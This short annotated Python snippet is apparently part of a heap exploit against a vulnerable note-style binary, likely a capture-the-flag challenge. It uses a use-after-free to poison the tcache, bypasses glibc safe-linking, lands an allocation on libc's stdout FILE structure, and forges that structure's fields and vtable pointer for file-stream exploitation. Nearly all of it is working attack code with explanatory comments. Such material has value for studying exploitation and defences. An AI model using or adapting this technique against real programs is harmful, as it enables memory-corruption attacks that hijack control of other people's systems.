# --- Preconditions established earlier in the script:
#   heap_base : leaked via tcache safe-linked fd
#   libc.address : leaked via unsorted-bin fd left in a freed note
#   idx_uaf : an index whose pointer is stale (freed, not nulled)

stdout = libc.sym['_IO_2_1_stdout_']                       # ❶ known offset in libc
wide_jumps = libc.sym['_IO_wfile_jumps']                   # allow-listed vtable

# Poison tcache so the next allocation of size 0x100 lands ON stdout.
edit(idx_uaf, p64((heap_base >> 12) ^ stdout))             # ❷ safe-linking write

alloc(9, 0xf0, b'x')                                       # first pop consumes stale slot
payload  = fit({                                           # ❸ forge the FILE fields
    0x00: 0xfbad1800,                                      # _flags: magic + no-buf
    0x20: 0,                                               # _IO_write_base
    0x28: 1,                                               # _IO_write_ptr > _base
    0x88: libc.sym['_IO_wfile_jumps'] - 0x20 + 0x40,       # forged _wide_data
    0xd8: wide_jumps,                                      # vtable -> _IO_wfile_jumps
}, length=0xf0)
alloc(10, 0xf0, payload)                                   # ❹ this alloc == stdout
